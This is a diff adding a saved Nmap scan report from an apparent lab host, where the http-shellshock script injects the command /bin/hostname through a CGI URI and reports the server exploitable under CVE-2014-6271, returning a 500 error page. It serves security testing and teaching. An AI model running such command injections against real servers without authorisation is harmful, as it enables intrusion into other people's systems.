@@ -1,0 +1,40 @@
+# Nmap 7.93 scan initiated Wed Nov  8 10:16:36 2023 as: nmap -p 80 --script http-shellshock.nse --script-args uri=/cgi-bin/hello.cgi,cmd=/bin/hostname -oN custom-command-output.txt 10.10.2.10
+Nmap scan report for Nissan_Skyline.cyberlab.test (10.10.2.10)
+Host is up (0.0014s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-shellshock: 
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|       This web application might be affected by the vulnerability known
+|       as Shellshock. It seems the server is executing commands injected
+|       via malicious HTTP headers.
+|             
+|     Disclosure date: 2014-09-24
+|     Exploit results:
+|       <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+|   <html><head>
+|   <title>500 Internal Server Error</title>
+|   </head><body>
+|   <h1>Internal Server Error</h1>
+|   <p>The server encountered an internal error or
+|   misconfiguration and was unable to complete
+|   your request.</p>
+|   <p>Please contact the server administrator,
+|    webmaster@localhost and inform them of the time the error occurred,
+|   and anything you might have done that may have
+|   caused the error.</p>
+|   <p>More information about this error may be available
+|   in the server error log.</p>
+|   </body></html>
+|   
+|     References:
+|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+|       http://seclists.org/oss-sec/2014/q3/685
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
+
+# Nmap done at Wed Nov  8 10:16:36 2023 -- 1 IP address (1 host up) scanned in 0.19 seconds
